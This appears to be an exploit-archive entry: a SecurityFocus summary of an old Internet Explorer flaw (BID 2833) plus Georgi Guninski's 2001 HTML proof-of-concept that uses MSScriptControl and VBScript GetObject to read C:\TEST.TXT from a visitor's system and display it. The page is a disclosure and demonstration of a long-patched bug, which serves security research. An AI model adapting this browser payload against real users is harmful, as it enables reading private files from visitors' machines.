@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/2833/info
+
+Internet Explorer contains a flaw which could enable a remote web site operator to retrieve a known file from a visiting user's system.
+
+If a specially formed script containing GetObject function with the known path to an existing file is embedded on a web page. Once the target user opens the web page, IE will return the contents of the file back to the web server.
+
+It may be possible to execute arbitrary commands, although it has not been confirmed. 
+
+<HTML>
+<HEAD>
+<TITLE>
+Security bug in Internet Explorer - MSScriptControl.ScriptControl
+</TITLE>
+</HEAD>
+<BODY>
+<H3>
+Security bug in Internet Explorer - MSScriptControl.ScriptControl
+</H3>
+<BR>
+<p>Legal Notice:
+<br>This Advisory and Demonstration is Copyright (c) 2001 Georgi Guninski. You may distribute
+it unmodified. You may not modify it and distribute it or distribute parts
+of it without the author's written permission.
+<p>Disclaimer:
+<br>The opinions expressed in this advisory and program are my own and
+not of any company.
+<br>The usual standard disclaimer applies, especially the fact that Georgi
+Guninski
+<br>is not liable for any damages caused by direct or&nbsp; indirect use
+of the information or functionality provided by this advisory or program.
+<br>Georgi Guninski, bears no responsibility for content or misuse of this
+advisory or program or any derivatives thereof.
+<BR>
+<h2>
+Wait a few seconds.
+</h2>
+<br>
+Read the <A HREF="scractx.html">Advisory</A> for more information.
+
+<script>
+alert("This script reads C:\\TEST.TXT\nYou may need to create it\n")
+v=new ActiveXObject("MSScriptControl.ScriptControl.1");
+v.Language="VBScript";
+x=v.eval('GetObject("c:/test.txt","htmlfile")');
+setTimeout("alert(x.body.outerHTML);",2000);
+</script>
+
+<BR>
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
